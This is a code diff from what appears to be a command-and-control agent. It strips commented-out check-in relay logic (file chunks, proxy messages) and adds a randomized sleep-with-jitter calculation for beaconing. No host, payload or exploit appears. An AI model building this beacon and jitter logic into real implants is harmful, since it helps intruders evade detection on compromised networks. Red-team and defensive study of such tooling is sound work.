@@ -29,40 +29,7 @@ namespace Agent.Communication
             {
                 try
                 {
-                    //var results = this.NetworkeService.GetMessageResultsToRelay();
-
-                    //var thisAgentRes = results.Where(a => a.Header.Owner == this.MessageService.AgentMetaData.Id);
-                    //if (thisAgentRes.Any())
-                    //{
-                    //    foreach (var mess in thisAgentRes)
-                    //        mess.FileChunk = this.FileService.GetChunkToSend();
-
-                    //    thisAgentRes.First().ProxyMessages = this.ProxyService.GetResponses();
-                    //}
-                    //else
-                    //{
-                    //    //check in message
-                    //    var chunk = this.FileService.GetChunkToSend();
-                    //    var proxy = this.ProxyService.GetResponses();
-
-                    //    var mess = new MessageResult();
-                    //    mess.Header.Owner = this.MessageService.AgentMetaData.Id;
-                    //    mess.FileChunk = chunk;
-                    //    mess.ProxyMessages = proxy;
-                    //    results.Add(mess);
-                    //}
-
-                    ////update Paths
-                    //foreach (var resMess in results)
-                    //    resMess.Header.Path.Insert(0, this.MessageService.AgentMetaData.Id);
-
-                    //var messages = await CheckIn(results);
-                    //if (messages != null)
-                    //    this.MessageService.EnqueueTasks(messages);
-
-
                     await this.DoCheckIn();
-
                 }
                 catch (Exception ex)
                 {
@@ -93,12 +60,20 @@ namespace Agent.Communication
 
         protected abstract Task<List<NetFrame>> CheckIn(List<NetFrame> frames);
 
-        protected virtual int GetDelay()
+        public static TimeSpan CalculateSleepTime(int interval, int jitter)
         {
-            return 10;
-            //int jit = (int)Math.Round(this.MessageService.AgentMetaData.SleepInterval * 1000 * (this.MessageService.AgentMetaData.SleepJitter / 100.0));
-            //var delta = random.Next(0, jit);
-            //return Math.Max(100,this.MessageService.AgentMetaData.SleepInterval * 1000 - delta);
+            var diff = (int)Math.Round((double)interval / 100 * jitter);
+
+            var min = interval - diff;
+            var max = interval + diff;
+
+            var rand = new Random();
+            return new TimeSpan(0, 0, rand.Next(min, max));
+        }
+
+        protected virtual TimeSpan GetDelay()
+        {
+            return CalculateSleepTime(this.Agent.MetaData.SleepInterval, this.Agent.MetaData.SleepJitter);
         }
 
         public override async Task SendFrame(NetFrame frame)
